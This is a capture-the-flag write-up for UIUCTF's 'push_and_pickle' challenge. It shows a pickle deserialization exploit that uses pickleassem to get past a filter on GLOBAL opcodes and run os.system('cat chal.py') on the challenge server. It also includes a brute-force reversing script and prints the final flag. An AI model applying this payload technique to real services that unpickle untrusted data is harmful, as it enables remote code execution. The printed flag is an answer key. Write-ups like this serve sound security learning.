https://ctftime.org/event/2275

# push_and_pickle (misc)

pickle deserialization task with two parts


## Solution
The first part filters the global and global_stack opcodes `c` and `\x93`
So if you are writing python then converting it to pickle it will be pretty hard to bypass the check.
Thankfully there is a tool called `pickleassem` that lets you write python assembly kinda like pwn shellcraft

# part1
```python
import pickle
import pickletools
import base64

from pwn import *

from pickleassem import PickleAssembler

pa = PickleAssembler(proto=4)
pa.push_mark()
pa.util_push('cat chal.py')
pa.build_inst('os', 'system')
payload = pa.assemble()
enc = base64.b64encode(payload).decode()
print(enc)

p = remote('push-and-pickle.chal.uiuc.tf', 1337, ssl=True)
p.sendline(enc)
p.interactive()
```

The second part is just a reversing challenge and you can skip most of it by using:
- radare with the pickle plugin
- uncompyle6 with python version < 3.9

solution part2
```python
flag = "lbp`sg~S:_p\x7fnf\x81yJ\x8bzP\x92\x95\x8cr\x88\x9d\x90\x8c\x7fb\x96\xa0\xa3\x9e\xae^\xa4s\xa5\xa6y}\xc8"
guess = "uiuctf{bbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA}"

def replace_str_index(text,index=0,replacement=''):
    return f'{text[:index]}{replacement}{text[index+1:]}'

def arg1(x, b):
    idx = x[0]
    return ord(x[1]) == (ord(b[idx]) + 2 * (idx + 97)) % 203
arg2 = enumerate(flag)

flag = ""
for item in arg2:
    for k in range(64):
        for i in range(256):
            char = chr(i)
            ret = arg1(item, replace_str_index(guess, k, char))
            if ret == True:
                flag = flag + char
                break

print(flag)
```

## Flag
`uiuctf{N3Ver_Und3r_3stiMate_P1ckles!e2ba24}`

shafouz 2024/06/28
